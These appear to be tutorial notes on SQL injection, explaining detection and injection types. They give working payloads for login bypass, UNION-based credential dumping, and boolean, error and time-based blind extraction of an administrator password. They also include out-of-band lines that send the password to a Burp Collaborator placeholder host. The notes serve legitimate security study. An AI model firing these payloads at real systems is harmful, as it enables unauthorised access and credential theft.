# SQL Injection

SQL injection (SQLi) is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. SQLi enables attackers to execute arbitrary SQL code on the database. This can lead to unauthorized data access, data manipulation, and, in some cases, full compromise of the database server.

---
## Detection

**SQL Injection Detection** involves systematically testing application inputs to see if user-supplied data can manipulate SQL queries. By submitting specially crafted inputs and observing the application’s responses such as error messages, differences in output, delayed responses, or external network interactions.

- Test input fields with a **single quote (`'`)** and look for errors or anomalies.
- Submit **SQL expressions** that evaluate to the original vs. different values, checking for response differences.
- Use **boolean conditions** like `OR 1=1` and `OR 1=2` to detect logic-based vulnerabilities.
- Send **time-delay payloads** (e.g., `SLEEP()` in MySQL) to detect **blind SQLi**.
- Use **OAST (Out-of-Band)** payloads to trigger external network interactions and monitor for database activity.

### SQL injection in different parts of the query

Most SQL injection vulnerabilities occur within the `WHERE` clause of a `SELECT` query.

Other Locations: 
- In `UPDATE` statements, within the updated values or the `WHERE` clause.
- In `INSERT` statements, within the inserted values.
- In `SELECT` statements, within the table or column name.
- In `SELECT` statements, within the `ORDER BY` clause.

---

## SQL Injection Types

SQL injection vulnerabilities can be classified based on how data is retrieved from the database and how the application responds to injected queries.

### 1. In-Band SQL Injection

In-band SQL injection occurs when the attacker uses the same communication channel to both launch the attack and retrieve data from the database. This is the most common form of SQL injection.

#### Error-Based SQL Injection
Error-based SQL injection relies on database error messages to obtain information about the database structure or stored data. If the application exposes verbose SQL errors, attackers can intentionally trigger errors to extract useful information.

#### UNION-Based SQL Injection
UNION-based SQL injection uses the SQL `UNION` operator to combine the results of the original query with another query controlled by the attacker. This allows attackers to retrieve additional data from other tables in the database.


### 2. Inferential SQL Injection (Blind SQL Injection)

Blind SQL injection occurs when the application does not return query results or detailed database errors, but attackers can still infer information from the application's behavior.

#### Boolean-Based SQL Injection
Boolean-based SQL injection involves sending queries that evaluate to true or false and observing differences in the application's responses. By testing conditions, attackers can infer database information one piece at a time.

#### Time-Based SQL Injection
Time-based SQL injection relies on database functions that introduce delays in query execution. Attackers use response timing differences to determine whether an injected condition evaluates to true or false.


### 3. Out-of-Band SQL Injection

Out-of-band SQL injection occurs when attackers retrieve data through a different communication channel rather than the application's direct response. This technique is used when in-band or blind techniques are not possible. The database is forced to initiate external interactions that allow attackers to receive data indirectly.


### 4. Second-Order SQL Injection

Second-order SQL injection occurs when a malicious payload is stored by the application and later executed when the stored data is used in another SQL query. The injection does not occur immediately when the payload is submitted but happens later when the stored input is processed by the database.

---
## Authentication Bypass 

An attacker can manipulate input (username or password fields) so that the database query used for login behaves differently, potentially allowing the attacker to log in without valid credentials.

Original SQL:
```
SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'
```

SQL comment sequence `--` to remove the password check from the `WHERE` clause of the query.
Attacker can add `'--` after username to comment out rest of the query and bypass authentication.

Malicious SQL:
```
SELECT * FROM users WHERE username = 'administrator'--' AND password = 'TheGreat'
```

---
## SQLi Union Attacks

An attacker can use a SQL injection vulnerability to retrieve data from other tables within the database. You can use the `UNION` keyword to execute an additional `SELECT` query and append the results to the original query.

For a `UNION` query to work, two key requirements must be met:
- The individual queries must return the same number of columns.
- The data types in each column must be compatible between the individual queries.

Union Query Example:
```
SELECT a, b FROM table1 UNION SELECT c, d FROM table2
```

### Retrieving Usernames and Passwords

Original Query:
```
SELECT name, description FROM products WHERE category = 'Gifts'
```

Attacker adds this to original query:
```
' UNION SELECT username, password FROM users--
```

### Determining the number of columns required

#### `ORDER BY` Clause: 

The `ORDER BY` clause can be used to determine how many columns exist in the result set.

```
' ORDER BY 1-- 
' ORDER BY 2-- 
' ORDER BY 3-- 
etc.
```

Database may return error such as:
```
The ORDER BY position number 3 is out of range of the number of items in the select list.
```

This error can used to detect how many columns exists in result set.

#### Using `NULL`

Submit queries with **incrementing numbers of `NULL` values** in the UNION SELECT
```
' UNION SELECT NULL-- 
' UNION SELECT NULL,NULL-- 
' UNION SELECT NULL,NULL,NULL-- 
etc.
```

Database may return error if NULL values do not match:
```
All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.
```

When the number of nulls matches the number of columns, the database returns an additional row in the result set, containing null values in each column.

### Finding columns with a useful data type

After you determine the number of required columns, you can probe each column to test whether it can hold string data.

```
' UNION SELECT 'a',NULL,NULL,NULL-- 
' UNION SELECT NULL,'a',NULL,NULL-- 
' UNION SELECT NULL,NULL,'a',NULL-- 
' UNION SELECT NULL,NULL,NULL,'a'--
```

If the column data type is not compatible with string data, the injected query will cause a database error, such as:
```
Conversion failed when converting the varchar value 'a' to data type int.
```

### Retrieving multiple values within a single column

You can retrieve multiple values together within this single column by concatenating the values together. You can include a separator to let you distinguish the combined values.

Oracle DB:
```
' UNION SELECT username || '~' || password FROM users--
```

Result:
```
... 
administrator~s3cure 
wiener~peter 
carlos~montoya 
...
```

---
## Blind SQL injection

Blind SQL injection occurs when an application is vulnerable to SQL injection, but its HTTP responses do not contain the results of the relevant SQL query or the details of any database errors.
- `UNION` Injection attack not possible in Blind SQL Injection

### Boolean Based SQL Injection

SQL Query:
```
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
```

You can retrieve information by triggering different responses conditionally, depending on an injected condition.

Payload 1:
```
' AND '1'='1
```
This causes the query to return results, because the injected `AND '1'='1` condition is true. 

Payload 2:
```
' AND '1'='2
```
This causes the query to not return any results, because the injected condition is false. 

This allows us to determine the answer to any single injected condition, and extract data one piece at a time.

Extract one charater at a time: 
```
' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
```

The `SUBSTRING` function is called `SUBSTR` on some types of database.

### Error-based SQL injection

Error-Based SQL Injection is a type of SQL Injection where an attacker sends SQL queries that cause the database to behave differently depending on whether a condition is true or false. If the injected statement is correct, the query runs normally; if it is wrong, the database generates an error. By observing these errors or response differences, attackers can infer information about the database.

#### Exploiting blind SQL injection by triggering conditional errors

Sometimes an application vulnerable to **Blind SQL Injection** behaves the same whether a SQL query returns data or not. In such cases, normal boolean-based techniques cannot be used because the application's response does not change.

In these situations, attackers can craft SQL queries that **trigger a database error only when a specific condition is true**.

Using SQL CASE statement to create conditional logic in the query.

No error occurs because condition is false
```
' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
```

Error Occurs because condition is true
```
' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
```

Using this method, attackers can retrieve sensitive information **one character at a time**. They test conditions on database values using SQL functions like **SUBSTRING**.

#### Extracting sensitive data via verbose SQL error messages

Occurs when a database or application is **misconfigured and displays detailed SQL error messages**. These errors can reveal useful information about the database structure.

Example Error
```
Unterminated string literal started at position 52 in SQL
SELECT * FROM tracking WHERE id = '''. Expected char
```

Attackers can intentionally trigger errors that **include database values inside the error message**.

This function tries to retrieve string value as integer, causing error that shows what is the string

```
CAST((SELECT password FROM users LIMIT 1) AS int)
```

Example Error Message:
```
ERROR: invalid input syntax for type integer: "PasswordOfUser"
```

### Time Based SQL Injection

when the application **handles errors gracefully** and responses do not change. attackers use **time delays** to determine whether a condition is true or false.

| Oracle     | `dbms_pipe.receive_message(('a'),10)` |
| ---------- | ------------------------------------- |
| Microsoft  | `WAITFOR DELAY '0:0:10'`              |
| PostgreSQL | `SELECT pg_sleep(10)`                 |
| MySQL      | `SELECT SLEEP(10)`                    |
Data Extraction
- Attackers test database values **one character at a time**.
- SQL functions like **SUBSTRING** are used to check characters in fields such as passwords.
- If the tested condition is true, the **response is delayed**, revealing information about the data.
```
'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
```

```
' || IF (SELECT COUNT(password) FROM users WHERE username = 'administrator' AND SUBSTRING(password,1,1) > 'm') = 1 pg_sleep(5)--
```
---

### Out-of-Band SQL Injection (OAST)

Out-of-Band SQL Injection occurs when attackers retrieve data through a different communication channel instead of the application's direct response. The database is forced to make external network requests (DNS / HTTP) to an attacker-controlled server.

This technique is useful when:

* The application does not return query results
* Error-based and time-based techniques are not effective
* The application is unstable or heavily filtered


#### Detection

OAST SQLi can be detected by triggering external interactions from the database.

* Inject payloads that cause the database to make DNS or HTTP requests
* Monitor interactions using tools like Burp Collaborator
* If a request is received → SQLi confirmed


#### MSSQL

Trigger DNS request:

```
'; exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'--
```


#### MySQL

```
LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')

SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\\a'
```


#### Oracle

```
' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual--
```


### OAST Data Exfiltration

Data can be exfiltrated by embedding query results into the external request.


#### MSSQL

```
'; declare @p varchar(1024);
set @p=(SELECT password FROM users WHERE username='Administrator');
exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')--
```


#### Oracle

```
SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual--
```


### Notes

* Requires external interaction monitoring (DNS / HTTP)
* Works well in blind SQL injection scenarios
* Useful when no response or errors are visible
* Data is extracted via attacker-controlled server logs
